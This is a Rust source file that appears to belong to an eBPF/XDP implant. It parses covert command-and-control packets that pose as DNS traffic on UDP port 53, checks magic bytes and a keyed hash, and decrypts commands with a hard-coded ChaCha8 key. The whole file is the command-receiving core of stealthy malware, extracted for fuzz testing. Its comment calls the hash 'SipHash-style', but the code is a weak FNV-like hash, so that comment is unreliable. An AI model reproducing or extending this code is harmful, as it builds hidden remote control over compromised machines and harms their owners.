//! User-space C2 packet parser — mirrors the eBPF XDP parsing logic.
//! Extracted for fuzz testing.

use crate::{CommandPayload, C2_CHACHA20_KEY, CHACHA20_NONCE_LEN, MAGIC_BYTES};
use core::mem;

#[derive(Debug, PartialEq)]
pub enum C2ParseError {
    TooShort,
    NotIpv4,
    NotUdp,
    NotPort53,
    BadMagic,
    HmacMismatch,
}

#[derive(Debug, PartialEq)]
pub struct C2Packet {
    pub command: CommandPayload,
    pub encrypted: bool,
}

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;
const ETH_P_IP: u16 = 0x0800;
const IPPROTO_UDP: u8 = 17;
const HMAC_LEN: usize = 16;

pub fn parse_c2_packet(data: &[u8]) -> Result<C2Packet, C2ParseError> {
    let legacy_min_len =
        ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 4 + mem::size_of::<CommandPayload>() + HMAC_LEN;
    if data.len() < legacy_min_len {
        return Err(C2ParseError::TooShort);
    }

    let eth_proto = u16::from_be_bytes([data[12], data[13]]);
    if eth_proto != ETH_P_IP {
        return Err(C2ParseError::NotIpv4);
    }

    let ip_start = ETH_HDR_LEN;
    let ip_proto = data[ip_start + 9];
    if ip_proto != IPPROTO_UDP {
        return Err(C2ParseError::NotUdp);
    }

    let udp_start = ip_start + IP_HDR_LEN;
    let dst_port = u16::from_be_bytes([data[udp_start + 2], data[udp_start + 3]]);
    if dst_port != 53 {
        return Err(C2ParseError::NotPort53);
    }

    let payload_start = udp_start + UDP_HDR_LEN;
    let magic = &data[payload_start..payload_start + 4];
    if magic != MAGIC_BYTES {
        return Err(C2ParseError::BadMagic);
    }

    let encrypted_min_len = ETH_HDR_LEN
        + IP_HDR_LEN
        + UDP_HDR_LEN
        + 4
        + CHACHA20_NONCE_LEN
        + mem::size_of::<CommandPayload>()
        + HMAC_LEN;

    let is_encrypted = data.len() >= encrypted_min_len;

    if is_encrypted {
        let nonce_start = payload_start + 4;
        let enc_payload_start = nonce_start + CHACHA20_NONCE_LEN;
        let mac_start = enc_payload_start + mem::size_of::<CommandPayload>();

        let received_mac = &data[mac_start..mac_start + HMAC_LEN];
        let hmac_data = &data[payload_start..enc_payload_start + mem::size_of::<CommandPayload>()];
        let computed_mac = compute_hmac(hmac_data);
        if received_mac != computed_mac.as_slice() {
            return Err(C2ParseError::HmacMismatch);
        }

        let nonce: [u8; 12] = data[nonce_start..nonce_start + 12].try_into().unwrap();
        let keystream = chacha8_block(&C2_CHACHA20_KEY, &nonce, 0);

        let mut dec_bytes = [0u8; 16];
        for i in 0..16 {
            dec_bytes[i] = data[enc_payload_start + i] ^ keystream[i];
        }

        let command = unsafe { *(dec_bytes.as_ptr() as *const CommandPayload) };
        Ok(C2Packet {
            command,
            encrypted: true,
        })
    } else {
        let cmd_start = payload_start + 4;
        let hmac_start = cmd_start + mem::size_of::<CommandPayload>();

        let received_hmac = &data[hmac_start..hmac_start + HMAC_LEN];
        let hmac_data = &data[payload_start..hmac_start];
        let computed_hmac = compute_hmac(hmac_data);
        if received_hmac != computed_hmac.as_slice() {
            return Err(C2ParseError::HmacMismatch);
        }

        let mut cmd_bytes = [0u8; 16];
        cmd_bytes.copy_from_slice(&data[cmd_start..cmd_start + 16]);
        let command = unsafe { *(cmd_bytes.as_ptr() as *const CommandPayload) };
        Ok(C2Packet {
            command,
            encrypted: false,
        })
    }
}

fn compute_hmac(data: &[u8]) -> [u8; 16] {
    // SipHash-style keyed hash (matches the eBPF compute_c2_hmac)
    let mut h: u64 = 0x736861646f77_u64;
    let mut i = 0;
    while i < data.len() {
        h = h.wrapping_mul(0x100000001b3);
        h ^= data[i] as u64;
        i += 1;
    }
    let h2 = h.wrapping_mul(0x517cc1b727220a95);
    let mut out = [0u8; 16];
    out[..8].copy_from_slice(&h.to_le_bytes());
    out[8..].copy_from_slice(&h2.to_le_bytes());
    out
}

fn chacha8_block(key: &[u8; 32], nonce: &[u8; 12], counter: u32) -> [u8; 64] {
    let mut state = [0u32; 16];
    state[0] = 0x61707865;
    state[1] = 0x3320646e;
    state[2] = 0x79622d32;
    state[3] = 0x6b206574;

    for i in 0..8 {
        state[4 + i] =
            u32::from_le_bytes([key[4 * i], key[4 * i + 1], key[4 * i + 2], key[4 * i + 3]]);
    }

    state[12] = counter;
    state[13] = u32::from_le_bytes([nonce[0], nonce[1], nonce[2], nonce[3]]);
    state[14] = u32::from_le_bytes([nonce[4], nonce[5], nonce[6], nonce[7]]);
    state[15] = u32::from_le_bytes([nonce[8], nonce[9], nonce[10], nonce[11]]);

    let initial = state;

    // 8 rounds (4 double-rounds)
    for _ in 0..4 {
        quarter_round(&mut state, 0, 4, 8, 12);
        quarter_round(&mut state, 1, 5, 9, 13);
        quarter_round(&mut state, 2, 6, 10, 14);
        quarter_round(&mut state, 3, 7, 11, 15);
        quarter_round(&mut state, 0, 5, 10, 15);
        quarter_round(&mut state, 1, 6, 11, 12);
        quarter_round(&mut state, 2, 7, 8, 13);
        quarter_round(&mut state, 3, 4, 9, 14);
    }

    for i in 0..16 {
        state[i] = state[i].wrapping_add(initial[i]);
    }

    let mut out = [0u8; 64];
    for i in 0..16 {
        let bytes = state[i].to_le_bytes();
        out[4 * i..4 * i + 4].copy_from_slice(&bytes);
    }
    out
}

fn quarter_round(s: &mut [u32; 16], a: usize, b: usize, c: usize, d: usize) {
    s[a] = s[a].wrapping_add(s[b]);
    s[d] ^= s[a];
    s[d] = s[d].rotate_left(16);
    s[c] = s[c].wrapping_add(s[d]);
    s[b] ^= s[c];
    s[b] = s[b].rotate_left(12);
    s[a] = s[a].wrapping_add(s[b]);
    s[d] ^= s[a];
    s[d] = s[d].rotate_left(8);
    s[c] = s[c].wrapping_add(s[d]);
    s[b] ^= s[c];
    s[b] = s[b].rotate_left(7);
}
